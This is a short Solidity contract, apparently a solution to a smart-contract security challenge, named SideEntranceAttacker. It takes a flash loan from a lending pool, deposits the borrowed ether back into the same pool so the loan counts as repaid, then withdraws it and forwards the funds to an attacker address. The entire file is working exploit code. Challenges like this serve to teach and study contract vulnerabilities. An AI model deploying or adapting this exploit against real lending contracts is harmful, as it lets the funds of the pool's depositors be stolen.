// SPDX-License-Identifier: MIT

pragma solidity >=0.6.0 <0.9.0;

import "./SideEntranceLenderPool.sol";

contract SideEntranceAttacker {
    SideEntranceLenderPool private immutable pool;
    address payable attacker;

    constructor(address _poolAddress, address _attacker){
        pool = SideEntranceLenderPool(_poolAddress);
        attacker = payable(_attacker);
    }

    function attack(uint256 _amount) external {
        pool.flashLoan(_amount);
        pool.withdraw();
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    receive () external payable {
        attacker.transfer(msg.value);
    }
}